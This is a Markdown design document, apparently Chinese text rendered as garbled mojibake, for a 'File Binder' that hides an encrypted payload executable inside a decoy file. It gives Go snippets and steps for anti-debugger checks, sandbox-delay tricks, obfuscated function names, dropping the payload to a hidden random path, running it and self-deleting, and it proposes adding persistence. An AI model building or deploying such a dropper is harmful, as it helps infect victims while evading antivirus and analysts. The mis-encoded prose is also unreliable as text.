# æŠ€æœ¯åŸç†è¯¦è§£

æœ¬æ–‡æ¡£è¯¦ç»†è¯´æ˜File Binderçš„æŠ€æœ¯å®ç°åŸç†å’Œå…æ€æœºåˆ¶ã€‚

## ğŸ—ï¸ æ•´ä½“æ¶æ„

### æ„å»ºé˜¶æ®µæ¶æ„

```
è¾“å…¥æ–‡ä»¶ â†’ åŠ å¯†å¤„ç† â†’ æ¨¡æ¿åµŒå…¥ â†’ ä»£ç ç”Ÿæˆ â†’ è‡ªåŠ¨ç¼–è¯‘ â†’ å¯æ‰§è¡Œæ–‡ä»¶
   â†“           â†“           â†“           â†“           â†“
Payload.exe  AES-GCM    Goæ¨¡æ¿     å®Œæ•´æºç     README.exe
æ™®é€šæ–‡ä»¶    éšæœºå¯†é’¥    æ•°æ®æ›¿æ¢    ç¼–è¯‘å‚æ•°    (æœ€ç»ˆäº§ç‰©)
```

### è¿è¡Œæ—¶æ¶æ„

```
å¯åŠ¨ â†’ ç¯å¢ƒæ£€æµ‹ â†’ è·¯å¾„ç”Ÿæˆ â†’ æ–‡ä»¶è§£å¯† â†’ å¼‚æ­¥æ‰§è¡Œ â†’ ç—•è¿¹æ¸…ç†
 â†“       â†“         â†“         â†“         â†“         â†“
åè°ƒè¯•   è¡Œä¸ºæ¨¡æ‹Ÿ   éšæœºç›®å½•   AESè§£å¯†   åˆ†ç¦»æ“ä½œ   è‡ªåŠ¨æ¸…ç†
```

## ğŸ” åŠ å¯†æœºåˆ¶

### AES-GCMç®—æ³•

File Binderä½¿ç”¨AES-GCMï¼ˆGalois/Counter Modeï¼‰ç®—æ³•ï¼Œæä¾›ï¼š

- **æœºå¯†æ€§**ï¼šæ•°æ®åŠ å¯†ä¿æŠ¤
- **å®Œæ•´æ€§**ï¼šé˜²ç¯¡æ”¹éªŒè¯
- **è®¤è¯æ€§**ï¼šç¡®ä¿æ•°æ®æ¥æº

### å¯†é’¥ç”Ÿæˆ

```go
// ä½¿ç”¨åŠ å¯†å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨
func GenerateRandomString(length int) (string, error) {
    bytes := make([]byte, length)
    _, err := rand.Read(bytes)  // crypto/rand
    if err != nil {
        return "", err
    }
    return hex.EncodeToString(bytes)[:length], nil
}
```

### åŠ å¯†æµç¨‹

1. **å¯†é’¥ç”Ÿæˆ**ï¼š32å­—èŠ‚éšæœºå¯†é’¥ï¼ˆ256ä½ï¼‰
2. **æ–‡ä»¶è¯»å–**ï¼šè¯»å–payloadå’Œæ™®é€šæ–‡ä»¶
3. **åˆ†åˆ«åŠ å¯†**ï¼šä½¿ç”¨åŒä¸€å¯†é’¥åˆ†åˆ«åŠ å¯†ä¸¤ä¸ªæ–‡ä»¶
4. **Base64ç¼–ç **ï¼šåŠ å¯†ç»“æœè½¬æ¢ä¸ºBase64å­—ç¬¦ä¸²
5. **æ¨¡æ¿åµŒå…¥**ï¼šå°†åŠ å¯†æ•°æ®åµŒå…¥Goä»£ç æ¨¡æ¿

## ğŸ›¡ï¸ å…æ€æŠ€æœ¯è¯¦è§£

### 1. åè°ƒè¯•æ£€æµ‹

```go
func checkEnvironment() bool {
    // æ£€æŸ¥è°ƒè¯•å™¨è¿›ç¨‹
    debuggerProcs := []string{"x64dbg", "ollydbg", "ida", "windbg"}
    for _, proc := range debuggerProcs {
        if _, err := exec.LookPath(proc); err == nil {
            return false  // å‘ç°è°ƒè¯•å™¨ï¼Œé€€å‡º
        }
    }
    return true
}
```

**æ£€æµ‹åŸç†**ï¼š
- é€šè¿‡`exec.LookPath`æ£€æŸ¥ç³»ç»ŸPATHä¸­æ˜¯å¦å­˜åœ¨è°ƒè¯•å™¨
- æ”¯æŒæ£€æµ‹ä¸»æµè°ƒè¯•å™¨ï¼šx64dbgã€OllyDbgã€IDA Proã€WinDbg
- å‘ç°è°ƒè¯•å™¨ç«‹å³é€€å‡ºï¼Œé¿å…è¢«åˆ†æ

### 2. è¡Œä¸ºæ¨¡æ‹Ÿ

```go
func normalBehavior() {
    // éšæœºå»¶è¿Ÿï¼Œæ¨¡æ‹Ÿæ­£å¸¸ç¨‹åºå¯åŠ¨
    time.Sleep(time.Duration(100+generateRandomDelay()) * time.Millisecond)
    
    // æ‰§è¡Œæ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨
    os.Getwd()
    os.Getenv("PATH")
}
```

**ç›®çš„**ï¼š
- æ¨¡æ‹Ÿæ­£å¸¸ç¨‹åºçš„å¯åŠ¨è¡Œä¸º
- å¢åŠ æ²™ç®±åˆ†æçš„æ—¶é—´æˆæœ¬
- é¿å…å¼‚å¸¸çš„å³æ—¶æ‰§è¡Œç‰¹å¾

### 3. åŠ¨æ€è·¯å¾„ç”Ÿæˆ

#### è·¯å¾„ç”Ÿæˆç®—æ³•

```go
// è·å–ç¯å¢ƒå˜é‡
userProfile := os.Getenv("USERPROFILE")
if userProfile == "" {
    userProfile = os.Getenv("TEMP")
}

// ç”Ÿæˆéšæœºç»„ä»¶
randomDir, _ := generateRandomString(6)   // 6ä½ç›®å½•å
randomName, _ := generateRandomString(8)  // 8ä½æ–‡ä»¶å

// æ„å»ºå®Œæ•´è·¯å¾„
payloadDir := filepath.Join(userProfile, randomDir)
payloadPath := filepath.Join(payloadDir, randomName+".exe")
```

#### éšæœºæ€§åˆ†æ

- **ç›®å½•å**ï¼š26^6 = 308,915,776ç§å¯èƒ½
- **æ–‡ä»¶å**ï¼š26^8 = 208,827,064,576ç§å¯èƒ½
- **æ€»ç»„åˆ**ï¼šçº¦6.4 Ã— 10^16ç§è·¯å¾„ç»„åˆ

### 4. å‡½æ•°åæ··æ·†

| åŸå§‹åç§° | æ··æ·†ååç§° | ä½œç”¨ |
|----------|------------|------|
| `selfDelete` | `cleanupTemp` | æ–‡ä»¶åˆ é™¤ |
| `setHidden` | `setFileAttribs` | è®¾ç½®å±æ€§ |
| `executePayload` | `normalBehavior` | æ‰§è¡Œé€»è¾‘ |

### 5. å¼‚æ­¥æ‰§è¡Œæœºåˆ¶

```go
// ä½¿ç”¨channelåŒæ­¥
payloadDone := make(chan bool, 1)

go func() {
    defer func() { payloadDone <- true }()
    
    // å»¶è¿Ÿæ‰§è¡Œ
    time.Sleep(2 * time.Second)
    
    // åˆ†æ­¥æ“ä½œ
    // 1. åˆ›å»ºæ–‡ä»¶
    // 2. å»¶è¿Ÿ500ms
    // 3. è®¾ç½®å±æ€§
    // 4. å»¶è¿Ÿ1s
    // 5. æ‰§è¡Œpayload
}()

// ä¸»ç¨‹åºç­‰å¾…
select {
case <-payloadDone:
    time.Sleep(5 * time.Second)
case <-time.After(15 * time.Second):
    // è¶…æ—¶ä¿æŠ¤
}
```

## ğŸ”„ æ‰§è¡Œæµç¨‹è¯¦è§£

### ç¬¬ä¸€é˜¶æ®µï¼šç¯å¢ƒæ£€æµ‹ï¼ˆ0-1ç§’ï¼‰

1. **åè°ƒè¯•æ£€æŸ¥**ï¼šæ£€æµ‹è°ƒè¯•å™¨è¿›ç¨‹
2. **ç¯å¢ƒæ¨¡æ‹Ÿ**ï¼šæ‰§è¡Œæ­£å¸¸ç³»ç»Ÿè°ƒç”¨
3. **éšæœºå»¶è¿Ÿ**ï¼š100-600æ¯«ç§’å»¶è¿Ÿ

### ç¬¬äºŒé˜¶æ®µï¼šè·¯å¾„å‡†å¤‡ï¼ˆ1-2ç§’ï¼‰

1. **è·å–ç¯å¢ƒå˜é‡**ï¼šUSERPROFILEæˆ–TEMP
2. **ç”Ÿæˆéšæœºå­—ç¬¦ä¸²**ï¼šç›®å½•åå’Œæ–‡ä»¶å
3. **åˆ›å»ºç›®å½•ç»“æ„**ï¼šåœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºéšæœºå­ç›®å½•
4. **å‡†å¤‡ä¸´æ—¶è·¯å¾„**ï¼šç”¨äºè‡ªèº«å‰¯æœ¬ç§»åŠ¨

### ç¬¬ä¸‰é˜¶æ®µï¼šæ–‡ä»¶å¤„ç†ï¼ˆ2-4ç§’ï¼‰

1. **è§£å¯†æ™®é€šæ–‡ä»¶**ï¼šAES-GCMè§£å¯†
2. **é‡Šæ”¾åˆ°å½“å‰ç›®å½•**ï¼šä¿æŒåŸæ–‡ä»¶å
3. **è‡ªåŠ¨æ‰“å¼€**ï¼šè°ƒç”¨ç³»ç»Ÿé»˜è®¤ç¨‹åº
4. **ç§»åŠ¨è‡ªèº«**ï¼šåˆ›å»ºä¸´æ—¶å‰¯æœ¬

### ç¬¬å››é˜¶æ®µï¼šPayloadæ‰§è¡Œï¼ˆ4-6ç§’ï¼‰

1. **è§£å¯†payload**ï¼šAES-GCMè§£å¯†
2. **å†™å…¥éšæœºè·¯å¾„**ï¼šç”¨æˆ·ç›®å½•ä¸‹çš„éšæœºä½ç½®
3. **è®¾ç½®æ–‡ä»¶å±æ€§**ï¼šéšè—å±æ€§
4. **å¼‚æ­¥æ‰§è¡Œ**ï¼šå¯åŠ¨payloadè¿›ç¨‹

### ç¬¬äº”é˜¶æ®µï¼šæ¸…ç†å·¥ä½œï¼ˆ6-15ç§’ï¼‰

1. **å»¶è¿Ÿæ¸…ç†**ï¼š3ç§’åå¼€å§‹æ¸…ç†
2. **åˆ é™¤ä¸´æ—¶æ–‡ä»¶**ï¼šä½¿ç”¨goroutineå¼‚æ­¥åˆ é™¤
3. **ç¨‹åºé€€å‡º**ï¼šä¸»ç¨‹åºæ­£å¸¸é€€å‡º

## ğŸ¯ å…æ€æ•ˆæœåˆ†æ

### é™æ€æ£€æµ‹è§„é¿

- **å­—ç¬¦ä¸²æ··æ·†**ï¼šæ— ç¡¬ç¼–ç æ•æ„Ÿå­—ç¬¦ä¸²
- **å‡½æ•°å‘½å**ï¼šä½¿ç”¨æ— å®³çš„å‡½æ•°å
- **ä»£ç ç»“æ„**ï¼šç¬¦åˆæ­£å¸¸Goç¨‹åºç»“æ„
- **ç¼–è¯‘é€‰é¡¹**ï¼šä½¿ç”¨æ ‡å‡†ç¼–è¯‘å‚æ•°

### åŠ¨æ€æ£€æµ‹è§„é¿

- **è¡Œä¸ºå»¶è¿Ÿ**ï¼šé¿å…ç«‹å³æ‰§è¡Œç‰¹å¾
- **è·¯å¾„éšæœº**ï¼šæ¯æ¬¡è¿è¡Œè·¯å¾„ä¸åŒ
- **åˆ†ç¦»æ‰§è¡Œ**ï¼šæ—¶é—´å’Œç©ºé—´åˆ†ç¦»
- **ç¯å¢ƒé€‚åº”**ï¼šæ™ºèƒ½å¤„ç†ä¸åŒç¯å¢ƒ

### æ²™ç®±è§„é¿

- **æ—¶é—´æ¶ˆè€—**ï¼šå¢åŠ åˆ†ææ—¶é—´æˆæœ¬
- **ç¯å¢ƒæ£€æµ‹**ï¼šè¯†åˆ«åˆ†æç¯å¢ƒ
- **æ­£å¸¸è¡Œä¸º**ï¼šæ¨¡æ‹Ÿåˆæ³•ç¨‹åº
- **èµ„æºæ¶ˆè€—**ï¼šé€‚åº¦çš„ç³»ç»Ÿèµ„æºä½¿ç”¨

## ğŸ”§ æŠ€æœ¯æ”¹è¿›ç©ºé—´

### å¯æ‰©å±•åŠŸèƒ½

1. **å¤šå±‚åŠ å¯†**ï¼šæ”¯æŒåµŒå¥—åŠ å¯†
2. **ç½‘ç»œé€šä¿¡**ï¼šæ·»åŠ è¿œç¨‹é…ç½®
3. **æŒä¹…åŒ–**ï¼šå¢åŠ æŒä¹…åŒ–æœºåˆ¶
4. **å¤šå¹³å°**ï¼šæ‰©å±•åˆ°Linux/macOS

### å®‰å…¨å¢å¼º

1. **æ›´å¤šåè°ƒè¯•**ï¼šç¡¬ä»¶æ–­ç‚¹æ£€æµ‹
2. **è™šæ‹Ÿæœºæ£€æµ‹**ï¼šVMç¯å¢ƒè¯†åˆ«
3. **ç½‘ç»œæ£€æµ‹**ï¼šè¯†åˆ«åˆ†æç½‘ç»œ
4. **æ—¶é—´æ£€æµ‹**ï¼šç³»ç»Ÿæ—¶é—´éªŒè¯

---

**æ³¨æ„**: æœ¬æ–‡æ¡£ä»…ç”¨äºæŠ€æœ¯å­¦ä¹ å’Œå®‰å…¨ç ”ç©¶ï¼Œè¯·éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ã€‚
